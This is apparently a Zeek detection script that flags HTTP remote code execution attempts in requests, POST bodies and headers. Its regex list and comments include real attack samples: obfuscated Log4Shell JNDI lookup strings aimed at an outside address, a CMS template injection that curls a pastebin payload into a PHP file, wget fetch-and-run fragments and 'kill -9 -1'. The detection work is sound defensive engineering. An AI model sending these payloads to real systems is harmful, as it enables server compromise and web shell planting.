##! Detect HTTP Remote Code Execution attempts.

# Possible future direction on how to improve this script:
    # Extract the URL, domain, or host used in the RCE for use in threat intelligence. 


module HTTP_RCE;


export {
    redef enum Notice::Type += {
        ## Indicates that a host performing RCE attacks was detected.
        RCE_Attacker,
        ## Indicates that a host was seen to have RCE attacks
        ## against it.  This is tracked by IP address as opposed to hostname.
        RCE_Victim,
        
    };

    redef enum HTTP::Tags += {
        ## Indicator of a URI-based RCE attack.
        URI_RCE,
        ## Indicator of client post body-based RCE attack. 
        POST_RCE,
        ## Indicator of a RCE attempt in HTTP headers.
        HEADER_RCE,
    };


    ## The idea with the included regex below is to focus on patterns that will almost always accompany an RCE.
    ## There are a many ways to obfuscate and many vulnerabilities to exploit.
    ## Only a handful of functions that can be used to begin the deobfuscating process and run the code. Keeps this simple.

    ## Future things to think about:
    ## Create a confidence index or scoring system. If we see <?php that's higher confidence than a semi-colon or just the number 1337.

    const match_rce_pattern =

    /(eval[[:space:]]*?\+*?\()/i |
    /(\$_POST\[)/ |
    /(\$_GET\[)/ |
    /(\$_FILES\[)/ |
    /(\$_REQUEST\[)/ |
    /(\<\?php)/i |
    /(echo[[:space:]]*?\+*?(\"|\\'|\"))/i |
    /(exec[[:space:]]*?\+*?\()/i |
    /(base64_decode[[:space:]]*?\+*?\()/i | 
    /(FromBase64String[[:space:]]*?\+*?\()/i |
    /(copy[[:space:]]*?\+*?\()/i |
    /(md5[[:space:]]*?\+*?\()/i |
    /(system[[:space:]]*?\+*?\()/i |
    /(gzinflate[[:space:]]*?\+*?\()/i |
    /(die[[:space:]]*?\+*?\()/i |
    /(fwrite[[:space:]]*?\+*?\()/i |
    /(fopen[[:space:]]*?\+*?\()/i |
    /(preg_replace[[:space:]]*?\+*?\()/i |
    /(str_replace[[:space:]]*?\+*?\()/i |
    /(file_get_contents[[:space:]]*?\+*?\()/i | #Example: $code = file_get_contents('https://pastebin[.]com/raw/63LjCNAs');
    /(PHP Obfuscator)/ |
    /\$\{.*?j.*?n.*?d.*?i.*?\:.*\/\/.*\}/i | # Based on https://nakedsecurity.sophos.com/2021/12/10/log4shell-java-vulnerability-how-to-safeguard-your-servers/ and Tweets about WAF bypasses.
    #   Examples:
    #   ua_list=[
    #   "${jndi:ldap://192.168.2.210/a}",
    #   "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//192.168.2.210/a}",
    #   "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://192.168.2.210/poc}",
    #   "${${::-j}ndi:rmi://192.168.2.210/abs}",
    #   "${${lower:jndi}:${lower:rmi}://192.168.2.210/poc}",
    #   "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://192.168.2.210:1389/a}",
    #   "${${::-j}ndi:rmi://192.168.2.210:1389/a}",
    #   "${${lower:${lower:jndi}}:${lower:rmi}://192.168.2.210/poc}"]
    # /(\?\>)/ | Too many false positives. Legitimate XML Ending
    # /(\%\>)/ | Too many false positives.

    /(curl[[:space:]]+?\++?).*?((-o)|(--output))|(\>)/i | # Example: [#markup]=curl%20https:// . Look for some type of file write.
    /(curl_init[[:space:]]*?\+*?\()/i |
    /(wget[[:space:]]+\++?)/i   # Need to make this more specific. # Example: [#markup]=wget -qO - http://

    #/(shell)/i | # Need to make this more specific. powershell? or shell.<extension> such as shell.php. Too many false positives with just "shell"
    #/(unsafe)/i # Need to make this more specific. Too many false positives. 

    # Functions that are candidates to be included, but disabled due to needing more data.
    #str_rot13 #Example: base64_decode(str_rot13(strrev('=Nj/8C+2NKkj8L
    #strrev #Example: base64_decode(str_rot13(strrev('=Nj/8C+2NKkj8L
    #urldecode #Example: HwEbwH=urldecode("%6E1%7A%62
    #__FILE__) #Example: <?php define('UztpJp0914',__FILE__);$HwEbwH
    #evaluateDynamicContent # Example: uri={{craft.app.view.evaluateDynamicContent('print(system("curl https://pastebin.com/raw/Tm4k3Ky3 > hank.php"));')}}
    #kill #Example: [#markup]=kill -9 -1;
    

    # Could also look for plaintext sites known for code:
        # pastbin.com 
        # raw.githubusercontent.com
        # etc

     &redef;


}


function format_rce_samples(samples: vector of SumStats::Observation): string
    {
    local ret = "RCE samples\n---------------------";
    for ( i in samples )
        ret += "\n\n" + samples[i]$str;
    return ret;
    }

event zeek_init()
    {
    # Add filters to the metrics so that the metrics framework knows how to
    # determine when it looks like an attacker and how to respond when
    # thresholds are crossed.
    local r1: SumStats::Reducer = [$stream="http.rce.attacker", $apply=set(SumStats::SUM, SumStats::SAMPLE), $num_samples=collect_RCE_samples];
    SumStats::create([$name="detect-rce-attackers",
              $epoch=rce_requests_interval,
              $reducers=set(r1),
              $threshold_val(key: SumStats::Key, result: SumStats::Result) =
                {
                return result["http.rce.attacker"]$sum;
                },
              $threshold=rce_requests_threshold,
              $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =
                {
                local r = result["http.rce.attacker"];
                NOTICE([$note=RCE_Attacker,
                    $msg="An RCE attacker was discovered!",
                    $sub=vector(format_rce_samples(r$samples))[0],
                    $src=key$host,
                    $identifier=cat(key$host)]);
                }]);

    local r2: SumStats::Reducer = [$stream="http.rce.victim", $apply=set(SumStats::SUM, SumStats::SAMPLE), $num_samples=collect_RCE_samples];
    SumStats::create([$name="detect-rce-victims",
              $epoch=rce_requests_interval,
              $reducers=set(r2),
              $threshold_val(key: SumStats::Key, result: SumStats::Result) =
                {
                return result["http.rce.victim"]$sum;
                },
              $threshold=rce_requests_threshold,
              $threshold_crossed(key: SumStats::Key, result: SumStats::Result) =
                {
                local r = result["http.rce.victim"];
                NOTICE([$note=RCE_Victim,
                    $msg="An RCE victim was discovered!",
                    $sub=vector(format_rce_samples(r$samples))[0],
                    $src=key$host,
                    $identifier=cat(key$host)]);
                }]);
    }

event http_request(c: connection, method: string, original_URI: string,
           unescaped_URI: string, version: string)
{
    # Efficiency technique.
    if(check_only_local_net == F || (check_only_local_net == T && c$id$resp_h in Site::local_nets))
    {
        # If RCE attempt is found, we want to tag the HTTP log and increment sumstats
        if ( match_rce_pattern in unescaped_URI )
        {
            add c$http$tags[URI_RCE];
            SumStats::observe("http.rce.attacker", [$host=c$id$orig_h], [$str=original_URI]);
            SumStats::observe("http.rce.victim",   [$host=c$id$resp_h], [$str=original_URI]);
        }
    }
}
event http_reply(c: connection, version: string, code: count, reason: string)
{
    # Efficiency technique.
    if(check_only_local_net == F || (check_only_local_net == T && c$id$resp_h in Site::local_nets))
    {
        # Admins should already have a post_body script installed and running.
        # The post_body field should already be written to the log at this point.
        # For efficiency sake, we use an existing field so Zeek only processes the packets once.
        # Typically the first 1024 bytes should be sufficient to detect most RCE attempts, although we don't have solid stats to back up that intuitive claim.
        if (c$http?$post_body)
        {
            if ( match_rce_pattern in c$http$post_body )
            {
                add c$http$tags[POST_RCE];
                SumStats::observe("http.rce.attacker", [$host=c$id$orig_h], [$str=c$http$post_body]);
                SumStats::observe("http.rce.victim",   [$host=c$id$resp_h], [$str=c$http$post_body]);
            }
        }
    }
}

event http_header(c: connection, is_orig: bool, name: string, value:string)
{
    # Efficiency technique.
    # It's unlikely a server on the local net is sending RCE headers, so ignore those for efficiency sake.
    if(check_only_local_net == F || (check_only_local_net == T && c$id$resp_h in Site::local_nets && is_orig == T))
    {
        if (match_rce_pattern in name || match_rce_pattern in value)
        {
            add c$http$tags[HEADER_RCE];
            SumStats::observe("http.rce.attacker", [$host=c$id$orig_h], [$str=name + ": " + value]);
            SumStats::observe("http.rce.victim",   [$host=c$id$resp_h], [$str=name + ": " + value]);
        }
    }
}